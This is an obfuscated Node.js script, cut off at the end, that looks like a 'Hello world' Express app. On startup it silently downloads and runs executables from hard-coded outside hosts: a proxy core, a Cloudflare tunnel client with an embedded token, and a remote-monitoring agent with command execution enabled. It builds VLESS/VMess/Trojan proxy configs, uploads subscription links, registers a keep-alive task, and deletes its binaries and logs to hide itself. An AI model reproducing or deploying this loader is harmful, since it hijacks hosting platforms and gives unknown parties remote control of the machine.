const _0x4a5163=_0x2b89;function _0x104e(){const _0xbfef83=['Empowerment\x20failed\x20for\x20','filter','FILE_PATH','2083','NEZHA_PORT','40adqDgi','&path=%2Fvless-argo%3Fed%3D2560#','log','127.0.0.1','set','listen','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','clear','boot.log','\x0a\x20\x20\x20\x20','8443','get','\x0a\x20\x20\x0avmess://','https://arm64.ssss.nyc.mn/bot','517rMLzso','has','split','.exe\x20>\x20nul\x202>&1','https://arm64.ssss.nyc.mn/web','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','map','config.json','/dev/null','Subscription\x20uploaded\x20successfully','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','/trojan-argo','tcp','all','from','tunnel.json','random','finish','arm64','Error\x20executing\x20command:\x20','test','\x20-c\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','env','unshift','https://amd64.ssss.nyc.mn/bot','SUB_PATH','Error\x20reading\x20boot.log:','\x20is\x20created','http','data','?security=tls&sni=','freedom','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','npm\x20running\x20error:\x20','false','https://amd64.ssss.nyc.mn/web','charAt','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','\x0a\x20\x20credentials-file:\x20','path','ARGO_PORT','statSync','length','sub.txt','join','\x20>/dev/null\x202>&1','\x20failed:\x20','application/json','eyJhIjoiNmU5NTkyOTgzMGE1YWI2MWZmZDg0YjA5Nzc0OWMyYTQiLCJ0IjoiMTQzZjFkOTAtOWVjOC00NjA2LTgwZDItM2EyMDNkOTIzOWE2IiwicyI6Ik5qQTFZV0ZoTlRRdFpHVXpOeTAwT1RNekxXRTFNRGN0WVdNd1l6UmhNbVUxTVdNMSJ9','nano','Nodes\x20uploaded\x20successfully','2323203byovie','toString','quic','utf-8','pkill\x20-f\x20\x22[','Railway','2087','close','tunnel.yml','https://amd64.ssss.nyc.mn/agent','abcdefghijklmnopqrstuvwxyz','createWriteStream','response','AUTO_ACCESS','message','\x0a\x20\x20tunnel:\x20','ArgoDomain:','Skipping\x20adding\x20automatic\x20access\x20task','config.yaml','post','existsSync','includes','trojan','stringify','https://amd64.ssss.nyc.mn/v1','ARGO_DOMAIN','web\x20running\x20error:\x20','https://arm64.ssss.nyc.mn/agent','216965jjIrJm','status','automatic\x20access\x20task\x20added\x20successfully','Empowerment\x20success\x20for\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','/vmess-argo','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','?encryption=none&security=tls&sni=','\x20>\x20nul\x202>&1','CFIP','push','vmess','204132kGVVGd','941274QHKDOx','match','amd','--tls','\x20-p\x20','del\x20/f\x20/q\x20','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','66KzpKdw','75016xRZADf','Download\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','/vless-argo','platform','Hello\x20world!','base64','isFile','App\x20is\x20running','fileUrl','988520fNFgSA','writeFileSync','NAME','none','mkdirSync','error','arch','pipe','ARGO_AUTH','exec','ARGO_DOMAIN:','/sub.txt\x20saved\x20successfully','UUID','PROJECT_URL','\x20-c\x20\x22','/api/add-nodes','blackhole','forEach','CFPORT','axios','child_process','rm\x20-rf\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','https://oooo.serv00.net/add-url','unlinkSync','readFileSync','send','2053','29NReVEd','\x20successfully','vless','Error\x20in\x20startserver:','/vmess-argo?ed=2560','NEZHA\x20variable\x20is\x20empty,skip\x20running','3720XxptrO','2096','direct','unlink','/config.json\x20>/dev/null\x202>&1\x20&','block','443','arm','basename','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','util','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','10766OqvBKx','\x20>/dev/null\x202>&1\x20&','SERVER_PORT','trim','\x0a\x20\x20\x0atrojan://','\x0avless://','list.txt','catch','text/plain;\x20charset=utf-8','https://arm64.ssss.nyc.mn/v1','&fp=firefox&type=ws&host=','&path=%2Ftrojan-argo%3Fed%3D2560#','nohup\x20','stream','firefox','./tmp','NEZHA_SERVER','TunnelSecret','\x20is\x20running','tls'];_0x104e=function(){return _0xbfef83;};return _0x104e();}(function(_0x5e1f53,_0x61139e){const _0x34858d=_0x2b89,_0x408a56=_0x5e1f53();while(!![]){try{const _0x5690fa=-parseInt(_0x34858d(0x1ba))/0x1*(-parseInt(_0x34858d(0x194))/0x2)+parseInt(_0x34858d(0x163))/0x3+-parseInt(_0x34858d(0x19e))/0x4+parseInt(_0x34858d(0x17f))/0x5*(-parseInt(_0x34858d(0x193))/0x6)+-parseInt(_0x34858d(0x1cc))/0x7*(-parseInt(_0x34858d(0x1c0))/0x8)+-parseInt(_0x34858d(0x18c))/0x9*(parseInt(_0x34858d(0x121))/0xa)+parseInt(_0x34858d(0x12f))/0xb*(-parseInt(_0x34858d(0x18b))/0xc);if(_0x5690fa===_0x61139e)break;else _0x408a56['push'](_0x408a56['shift']());}catch(_0x5c937b){_0x408a56['push'](_0x408a56['shift']());}}}(_0x104e,0x9b06d));const express=require('express'),app=express(),axios=require(_0x4a5163(0x1b1)),os=require('os'),fs=require('fs'),path=require(_0x4a5163(0x157)),{promisify}=require(_0x4a5163(0x1ca)),exec=promisify(require('child_process')[_0x4a5163(0x1a7)]),{execSync}=require(_0x4a5163(0x1b2)),UPLOAD_URL=process['env']['UPLOAD_URL']||'',PROJECT_URL=process[_0x4a5163(0x146)][_0x4a5163(0x1ab)]||'',AUTO_ACCESS=process[_0x4a5163(0x146)][_0x4a5163(0x170)]||![],FILE_PATH=process[_0x4a5163(0x146)][_0x4a5163(0x11e)]||_0x4a5163(0x1db),SUB_PATH=process['env'][_0x4a5163(0x149)]||_0x4a5163(0x161),PORT=process[_0x4a5163(0x146)][_0x4a5163(0x1ce)]||process[_0x4a5163(0x146)]['PORT']||0xbb8,UUID=process[_0x4a5163(0x146)][_0x4a5163(0x1aa)]||'fb1d7e93-adc5-4591-98d9-019cb546c20b',NEZHA_SERVER=process[_0x4a5163(0x146)][_0x4a5163(0x1dc)]||'',NEZHA_PORT=process[_0x4a5163(0x146)][_0x4a5163(0x120)]||'',NEZHA_KEY=process[_0x4a5163(0x146)]['NEZHA_KEY']||'',ARGO_DOMAIN=process['env'][_0x4a5163(0x17c)]||'railway.aaff.dpdns.org',ARGO_AUTH=process[_0x4a5163(0x146)][_0x4a5163(0x1a6)]||_0x4a5163(0x160),ARGO_PORT=process[_0x4a5163(0x146)][_0x4a5163(0x158)]||0x1f41,CFIP=process[_0x4a5163(0x146)][_0x4a5163(0x188)]||'cdns.doon.eu.org',CFPORT=process['env'][_0x4a5163(0x1b0)]||0x1bb,NAME=process[_0x4a5163(0x146)][_0x4a5163(0x1a0)]||_0x4a5163(0x168);!fs[_0x4a5163(0x177)](FILE_PATH)?(fs[_0x4a5163(0x1a2)](FILE_PATH),console['log'](FILE_PATH+_0x4a5163(0x14b))):console['log'](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x1070f5=_0x4a5163,_0x476ac5=_0x1070f5(0x16d);let _0x40dbf0='';for(let _0x35e38e=0x0;_0x35e38e<0x6;_0x35e38e++){_0x40dbf0+=_0x476ac5[_0x1070f5(0x154)](Math['floor'](Math[_0x1070f5(0x13f)]()*_0x476ac5[_0x1070f5(0x15a)]));}return _0x40dbf0;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x4a5163(0x15c)](FILE_PATH,phpName),webPath=path[_0x4a5163(0x15c)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x4a5163(0x15c)](FILE_PATH,_0x4a5163(0x15b)),listPath=path[_0x4a5163(0x15c)](FILE_PATH,_0x4a5163(0x1d2)),bootLogPath=path[_0x4a5163(0x15c)](FILE_PATH,_0x4a5163(0x129)),configPath=path['join'](FILE_PATH,'config.json');function deleteNodes(){const _0x36ada0=_0x4a5163;try{if(!UPLOAD_URL)return;if(!fs[_0x36ada0(0x177)](subPath))return;let _0x1987d2;try{_0x1987d2=fs[_0x36ada0(0x1b7)](subPath,_0x36ada0(0x166));}catch{return null;}const _0x5b1a78=Buffer[_0x36ada0(0x13d)](_0x1987d2,'base64')[_0x36ada0(0x164)](_0x36ada0(0x166)),_0x1a6fe4=_0x5b1a78[_0x36ada0(0x131)]('\x0a')[_0x36ada0(0x11d)](_0x3017cd=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x36ada0(0x143)](_0x3017cd));if(_0x1a6fe4[_0x36ada0(0x15a)]===0x0)return;return axios[_0x36ada0(0x176)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x36ada0(0x17a)]({'nodes':_0x1a6fe4}),{'headers':{'Content-Type':_0x36ada0(0x15f)}})[_0x36ada0(0x1d3)](_0x9620a2=>{return null;}),null;}catch(_0x5433a1){return null;}}function cleanupOldFiles(){const _0x44011e=_0x4a5163;try{const _0x2d7c43=fs['readdirSync'](FILE_PATH);_0x2d7c43[_0x44011e(0x1af)](_0x244ddf=>{const _0x2ec82c=_0x44011e,_0x311850=path[_0x2ec82c(0x15c)](FILE_PATH,_0x244ddf);try{const _0x4de28a=fs[_0x2ec82c(0x159)](_0x311850);_0x4de28a[_0x2ec82c(0x19b)]()&&fs[_0x2ec82c(0x1b6)](_0x311850);}catch(_0x1aa7ca){}});}catch(_0xfecfae){}}app[_0x4a5163(0x12c)]('/',function(_0xee6cbe,_0x1f1927){const _0x5c6cf8=_0x4a5163;_0x1f1927[_0x5c6cf8(0x1b8)](_0x5c6cf8(0x199));});async function generateConfig(){const _0x55c2ff=_0x4a5163,_0x249906={'log':{'access':'/dev/null','error':_0x55c2ff(0x137),'loglevel':_0x55c2ff(0x1a1)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x55c2ff(0x1bc),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x55c2ff(0x184),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x55c2ff(0x13b),'security':'none'}},{'port':0xbba,'listen':_0x55c2ff(0x124),'protocol':_0x55c2ff(0x1bc),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x55c2ff(0x1a1)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x55c2ff(0x197)}},'sniffing':{'enabled':!![],'destOverride':[_0x55c2ff(0x14c),'tls','quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x55c2ff(0x18a),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x55c2ff(0x184)}},'sniffing':{'enabled':!![],'destOverride':[_0x55c2ff(0x14c),_0x55c2ff(0x11b),_0x55c2ff(0x165)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x55c2ff(0x124),'protocol':_0x55c2ff(0x179),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x55c2ff(0x1a1),'wsSettings':{'path':_0x55c2ff(0x13a)}},'sniffing':{'enabled':!![],'destOverride':[_0x55c2ff(0x14c),'tls',_0x55c2ff(0x165)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x55c2ff(0x14f),'tag':_0x55c2ff(0x1c2)},{'protocol':_0x55c2ff(0x1ae),'tag':_0x55c2ff(0x1c5)}]};fs['writeFileSync'](path[_0x55c2ff(0x15c)](FILE_PATH,_0x55c2ff(0x136)),JSON[_0x55c2ff(0x17a)](_0x249906,null,0x2));}function getSystemArchitecture(){const _0x1ca7b3=_0x4a5163,_0x4798d4=os[_0x1ca7b3(0x1a4)]();return _0x4798d4===_0x1ca7b3(0x1c7)||_0x4798d4===_0x1ca7b3(0x141)||_0x4798d4==='aarch64'?_0x1ca7b3(0x1c7):_0x1ca7b3(0x18e);}function _0x2b89(_0x4ea41f,_0x295c5c){const _0x104e09=_0x104e();return _0x2b89=function(_0x2b8998,_0x6786bb){_0x2b8998=_0x2b8998-0x11a;let _0x30ef69=_0x104e09[_0x2b8998];return _0x30ef69;},_0x2b89(_0x4ea41f,_0x295c5c);}function downloadFile(_0x409b77,_0x14856b,_0x10d731){const _0x37a1c1=_0x4a5163,_0x49a521=_0x409b77;!fs[_0x37a1c1(0x177)](FILE_PATH)&&fs[_0x37a1c1(0x1a2)](FILE_PATH,{'recursive':!![]});const _0x3f54dc=fs[_0x37a1c1(0x16e)](_0x49a521);axios({'method':_0x37a1c1(0x12c),'url':_0x14856b,'responseType':_0x37a1c1(0x1d9)})['then'](_0x2a85ce=>{const _0x596e56=_0x37a1c1;_0x2a85ce[_0x596e56(0x14d)][_0x596e56(0x1a5)](_0x3f54dc),_0x3f54dc['on'](_0x596e56(0x140),()=>{const _0x42ac94=_0x596e56;_0x3f54dc[_0x42ac94(0x16a)](),console[_0x42ac94(0x123)](_0x42ac94(0x195)+path[_0x42ac94(0x1c8)](_0x49a521)+_0x42ac94(0x1bb)),_0x10d731(null,_0x49a521);}),_0x3f54dc['on'](_0x596e56(0x1a3),_0x5027b2=>{const _0x5bb0b9=_0x596e56;fs[_0x5bb0b9(0x1c3)](_0x49a521,()=>{});const _0x319afa='Download\x20'+path[_0x5bb0b9(0x1c8)](_0x49a521)+_0x5bb0b9(0x15e)+_0x5027b2[_0x5bb0b9(0x171)];console['error'](_0x319afa),_0x10d731(_0x319afa);});})[_0x37a1c1(0x1d3)](_0x230fd3=>{const _0x17f4b0=_0x37a1c1,_0x495231=_0x17f4b0(0x195)+path[_0x17f4b0(0x1c8)](_0x49a521)+_0x17f4b0(0x15e)+_0x230fd3[_0x17f4b0(0x171)];console[_0x17f4b0(0x1a3)](_0x495231),_0x10d731(_0x495231);});}async function downloadFilesAndRun(){const _0x57d2b7=_0x4a5163,_0x3a327e=getSystemArchitecture(),_0x26ad8d=getFilesForArchitecture(_0x3a327e);if(_0x26ad8d[_0x57d2b7(0x15a)]===0x0){console[_0x57d2b7(0x123)](_0x57d2b7(0x127));return;}const _0x50eb4c=_0x26ad8d[_0x57d2b7(0x135)](_0x3c5403=>{return new Promise((_0x3eab50,_0x53eaa2)=>{const _0x4315ab=_0x2b89;downloadFile(_0x3c5403['fileName'],_0x3c5403[_0x4315ab(0x19d)],(_0x29f0cd,_0x4f1292)=>{_0x29f0cd?_0x53eaa2(_0x29f0cd):_0x3eab50(_0x4f1292);});});});try{await Promise[_0x57d2b7(0x13c)](_0x50eb4c);}catch(_0x5c84d0){console[_0x57d2b7(0x1a3)]('Error\x20downloading\x20files:',_0x5c84d0);return;}function _0x1a2710(_0xd3d400){const _0x507a24=0x1fd;_0xd3d400['forEach'](_0x187022=>{const _0x5b6e13=_0x2b89;fs[_0x5b6e13(0x177)](_0x187022)&&fs['chmod'](_0x187022,_0x507a24,_0x4b0c8d=>{const _0x322a2b=_0x5b6e13;_0x4b0c8d?console[_0x322a2b(0x1a3)](_0x322a2b(0x11c)+_0x187022+':\x20'+_0x4b0c8d):console[_0x322a2b(0x123)](_0x322a2b(0x182)+_0x187022+':\x20'+_0x507a24[_0x322a2b(0x164)](0x8));});});}const _0x46655e=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x1a2710(_0x46655e);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x462281=NEZHA_SERVER[_0x57d2b7(0x178)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x10b1b7=new Set([_0x57d2b7(0x1c6),_0x57d2b7(0x12b),'2096',_0x57d2b7(0x169),_0x57d2b7(0x11f),_0x57d2b7(0x1b9)]),_0x420594=_0x10b1b7[_0x57d2b7(0x130)](_0x462281)?'true':_0x57d2b7(0x152),_0x3e335d='\x0aclient_secret:\x20'+NEZHA_KEY+_0x57d2b7(0x1c9)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x420594+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x57d2b7(0x19f)](path['join'](FILE_PATH,_0x57d2b7(0x175)),_0x3e335d);const _0x263874='nohup\x20'+phpPath+_0x57d2b7(0x1ac)+FILE_PATH+_0x57d2b7(0x155);try{await exec(_0x263874),console[_0x57d2b7(0x123)](phpName+_0x57d2b7(0x11a)),await new Promise(_0x2273e1=>setTimeout(_0x2273e1,0x3e8));}catch(_0x478142){console[_0x57d2b7(0x1a3)]('php\x20running\x20error:\x20'+_0x478142);}}else{let _0x41b52e='';const _0x5920e6=[_0x57d2b7(0x1c6),_0x57d2b7(0x12b),_0x57d2b7(0x1c1),_0x57d2b7(0x169),_0x57d2b7(0x11f),_0x57d2b7(0x1b9)];_0x5920e6[_0x57d2b7(0x178)](NEZHA_PORT)&&(_0x41b52e=_0x57d2b7(0x18f));const _0x4ace3c=_0x57d2b7(0x1d8)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x57d2b7(0x190)+NEZHA_KEY+'\x20'+_0x41b52e+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x4ace3c),console[_0x57d2b7(0x123)](npmName+_0x57d2b7(0x11a)),await new Promise(_0x1a61b1=>setTimeout(_0x1a61b1,0x3e8));}catch(_0x31367){console[_0x57d2b7(0x1a3)](_0x57d2b7(0x151)+_0x31367);}}}else console['log'](_0x57d2b7(0x1bf));const _0x56bf77=_0x57d2b7(0x1d8)+webPath+_0x57d2b7(0x144)+FILE_PATH+_0x57d2b7(0x1c4);try{await exec(_0x56bf77),console['log'](webName+_0x57d2b7(0x11a)),await new Promise(_0x356b56=>setTimeout(_0x356b56,0x3e8));}catch(_0x319ef7){console[_0x57d2b7(0x1a3)](_0x57d2b7(0x17d)+_0x319ef7);}if(fs['existsSync'](botPath)){let _0x24614d;if(ARGO_AUTH[_0x57d2b7(0x18d)](/^[A-Z0-9a-z=]{120,250}$/))_0x24614d=_0x57d2b7(0x1cb)+ARGO_AUTH;else ARGO_AUTH[_0x57d2b7(0x18d)](/TunnelSecret/)?_0x24614d=_0x57d2b7(0x150)+FILE_PATH+'/tunnel.yml\x20run':_0x24614d=_0x57d2b7(0x196)+FILE_PATH+_0x57d2b7(0x145)+ARGO_PORT;try{await exec(_0x57d2b7(0x1d8)+botPath+'\x20'+_0x24614d+_0x57d2b7(0x1cd)),console['log'](botName+_0x57d2b7(0x11a)),await new Promise(_0x5c5c5f=>setTimeout(_0x5c5c5f,0x7d0));}catch(_0x34f444){console[_0x57d2b7(0x1a3)](_0x57d2b7(0x142)+_0x34f444);}}await new Promise(_0x73cc69=>setTimeout(_0x73cc69,0x1388));}function getFilesForArchitecture(_0x245cfc){const _0x11c11a=_0x4a5163;let _0x31e6a4;_0x245cfc===_0x11c11a(0x1c7)?_0x31e6a4=[{'fileName':webPath,'fileUrl':_0x11c11a(0x133)},{'fileName':botPath,'fileUrl':_0x11c11a(0x12e)}]:_0x31e6a4=[{'fileName':webPath,'fileUrl':_0x11c11a(0x153)},{'fileName':botPath,'fileUrl':_0x11c11a(0x148)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x140b67=_0x245cfc==='arm'?_0x11c11a(0x17e):_0x11c11a(0x16c);_0x31e6a4[_0x11c11a(0x147)]({'fileName':npmPath,'fileUrl':_0x140b67});}else{const _0xb22d9=_0x245cfc===_0x11c11a(0x1c7)?_0x11c11a(0x1d5):_0x11c11a(0x17b);_0x31e6a4[_0x11c11a(0x147)]({'fileName':phpPath,'fileUrl':_0xb22d9});}}return _0x31e6a4;}function argoType(){const _0x482e40=_0x4a5163;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x482e40(0x123)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x482e40(0x178)](_0x482e40(0x1dd))){fs['writeFileSync'](path['join'](FILE_PATH,_0x482e40(0x13e)),ARGO_AUTH);const _0x5d4229=_0x482e40(0x172)+ARGO_AUTH[_0x482e40(0x131)]('\x22')[0xb]+_0x482e40(0x156)+path[_0x482e40(0x15c)](FILE_PATH,'tunnel.json')+_0x482e40(0x139)+ARGO_DOMAIN+_0x482e40(0x134)+ARGO_PORT+_0x482e40(0x183);fs[_0x482e40(0x19f)](path[_0x482e40(0x15c)](FILE_PATH,_0x482e40(0x16b)),_0x5d4229);}else console['log'](_0x482e40(0x1b4));}argoType();async function extractDomains(){const _0x33702d=_0x4a5163;let _0x23b2f8;if(ARGO_AUTH&&ARGO_DOMAIN)_0x23b2f8=ARGO_DOMAIN,console[_0x33702d(0x123)](_0x33702d(0x1a8),_0x23b2f8),await _0x3764ec(_0x23b2f8);else try{const _0x2a5891=fs[_0x33702d(0x1b7)](path[_0x33702d(0x15c)](FILE_PATH,_0x33702d(0x129)),_0x33702d(0x166)),_0x466db8=_0x2a5891[_0x33702d(0x131)]('\x0a'),_0x4346c4=[];_0x466db8[_0x33702d(0x1af)](_0x28fff9=>{const _0x492af9=_0x33702d,_0x177b02=_0x28fff9[_0x492af9(0x18d)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x177b02){const _0x5c4f3f=_0x177b02[0x1];_0x4346c4[_0x492af9(0x189)](_0x5c4f3f);}});if(_0x4346c4[_0x33702d(0x15a)]>0x0)_0x23b2f8=_0x4346c4[0x0],console['log'](_0x33702d(0x173),_0x23b2f8),await _0x3764ec(_0x23b2f8);else{console[_0x33702d(0x123)](_0x33702d(0x185)),fs[_0x33702d(0x1b6)](path[_0x33702d(0x15c)](FILE_PATH,_0x33702d(0x129)));async function _0x34ed51(){const _0x431548=_0x33702d;try{process['platform']==='win32'?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x431548(0x132)):await exec(_0x431548(0x167)+botName[_0x431548(0x154)](0x0)+']'+botName['substring'](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x4782ff){}}_0x34ed51(),await new Promise(_0x486a25=>setTimeout(_0x486a25,0xbb8));const _0x4366fa=_0x33702d(0x196)+FILE_PATH+_0x33702d(0x145)+ARGO_PORT;try{await exec(_0x33702d(0x1d8)+botPath+'\x20'+_0x4366fa+_0x33702d(0x1cd)),console[_0x33702d(0x123)](botName+_0x33702d(0x11a)),await new Promise(_0x25ba24=>setTimeout(_0x25ba24,0xbb8)),await extractDomains();}catch(_0x3589cd){console[_0x33702d(0x1a3)]('Error\x20executing\x20command:\x20'+_0x3589cd);}}}catch(_0xd12e11){console[_0x33702d(0x1a3)](_0x33702d(0x14a),_0xd12e11);}async function _0x3764ec(_0x52dd7d){const _0x1131c6=_0x33702d,_0x5cb5eb=execSync(_0x1131c6(0x192),{'encoding':_0x1131c6(0x166)}),_0x115049=_0x5cb5eb[_0x1131c6(0x1cf)](),_0x236847=NAME?NAME+'-'+_0x115049:_0x115049;return new Promise(_0x592dcc=>{setTimeout(()=>{const _0x1acdae=_0x2b89,_0x2a0a8b={'v':'2','ps':''+_0x236847,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x1acdae(0x1a1),'net':'ws','type':_0x1acdae(0x1a1),'host':_0x52dd7d,'path':_0x1acdae(0x1be),'tls':_0x1acdae(0x11b),'sni':_0x52dd7d,'alpn':'','fp':_0x1acdae(0x1da)},_0x31b6a1=_0x1acdae(0x1d1)+UUID+'@'+CFIP+':'+CFPORT+_0x1acdae(0x186)+_0x52dd7d+_0x1acdae(0x1d6)+_0x52dd7d+_0x1acdae(0x122)+_0x236847+_0x1acdae(0x12d)+Buffer[_0x1acdae(0x13d)](JSON[_0x1acdae(0x17a)](_0x2a0a8b))[_0x1acdae(0x164)](_0x1acdae(0x19a))+_0x1acdae(0x1d0)+UUID+'@'+CFIP+':'+CFPORT+_0x1acdae(0x14e)+_0x52dd7d+_0x1acdae(0x1d6)+_0x52dd7d+_0x1acdae(0x1d7)+_0x236847+_0x1acdae(0x12a);console[_0x1acdae(0x123)](Buffer['from'](_0x31b6a1)[_0x1acdae(0x164)]('base64')),fs['writeFileSync'](subPath,Buffer[_0x1acdae(0x13d)](_0x31b6a1)['toString']('base64')),console[_0x1acdae(0x123)](FILE_PATH+_0x1acdae(0x1a9)),uploadNodes(),app[_0x1acdae(0x12c)]('/'+SUB_PATH,(_0x4e98db,_0x24a4f8)=>{const _0x1274b0=_0x1acdae,_0x3ad22b=Buffer[_0x1274b0(0x13d)](_0x31b6a1)['toString'](_0x1274b0(0x19a));_0x24a4f8[_0x1274b0(0x125)]('Content-Type',_0x1274b0(0x1d4)),_0x24a4f8[_0x1274b0(0x1b8)](_0x3ad22b);}),_0x592dcc(_0x31b6a1);},0x7d0);});}}async function uploadNodes(){const _0x59fa1c=_0x4a5163;if(UPLOAD_URL&&PROJECT_URL){const _0xdd3551=PROJECT_URL+'/'+SUB_PATH,_0x3b6079={'subscription':[_0xdd3551]};try{const _0x10e7ff=await axios[_0x59fa1c(0x176)](UPLOAD_URL+'/api/add-subscriptions',_0x3b6079,{'headers':{'Content-Type':_0x59fa1c(0x15f)}});return _0x10e7ff&&_0x10e7ff['status']===0xc8?(console['log'](_0x59fa1c(0x138)),_0x10e7ff):null;}catch(_0x4cba53){if(_0x4cba53[_0x59fa1c(0x16f)]){if(_0x4cba53['response'][_0x59fa1c(0x180)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x1640f6=fs[_0x59fa1c(0x1b7)](listPath,_0x59fa1c(0x166)),_0x36caa3=_0x1640f6[_0x59fa1c(0x131)]('\x0a')[_0x59fa1c(0x11d)](_0x437496=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x59fa1c(0x143)](_0x437496));if(_0x36caa3['length']===0x0)return;const _0xed455f=JSON[_0x59fa1c(0x17a)]({'nodes':_0x36caa3});try{const _0x524aa5=await axios[_0x59fa1c(0x176)](UPLOAD_URL+_0x59fa1c(0x1ad),_0xed455f,{'headers':{'Content-Type':_0x59fa1c(0x15f)}});return _0x524aa5&&_0x524aa5[_0x59fa1c(0x180)]===0xc8?(console[_0x59fa1c(0x123)](_0x59fa1c(0x162)),_0x524aa5):null;}catch(_0x57d94e){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x2c3338=_0x2b89,_0x7841a6=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x7841a6[_0x2c3338(0x189)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x7841a6[_0x2c3338(0x189)](phpPath);process[_0x2c3338(0x198)]==='win32'?exec(_0x2c3338(0x191)+_0x7841a6[_0x2c3338(0x15c)]('\x20')+_0x2c3338(0x187),_0x478e8f=>{const _0xf2b0a8=_0x2c3338;console[_0xf2b0a8(0x128)](),console[_0xf2b0a8(0x123)](_0xf2b0a8(0x19c)),console[_0xf2b0a8(0x123)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x2c3338(0x1b3)+_0x7841a6[_0x2c3338(0x15c)]('\x20')+_0x2c3338(0x15d),_0x2a8f50=>{const _0x21f58f=_0x2c3338;console[_0x21f58f(0x128)](),console[_0x21f58f(0x123)](_0x21f58f(0x19c)),console[_0x21f58f(0x123)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x24c61b=_0x4a5163;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x24c61b(0x123)](_0x24c61b(0x174));return;}try{const _0xfff386=await axios[_0x24c61b(0x176)](_0x24c61b(0x1b5),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x24c61b(0x15f)}});return console[_0x24c61b(0x123)](_0x24c61b(0x181)),_0xfff386;}catch(_0x1e7fda){return console[_0x24c61b(0x1a3)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x1e7fda[_0x24c61b(0x171)]),null;}}async function startserver(){const _0x263019=_0x4a5163;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x12f9f8){console['error'](_0x263019(0x1bd),_0x12f9f8);}}startserver()[_0x4a5163(0x1d3)](_0x50fd16=>{const 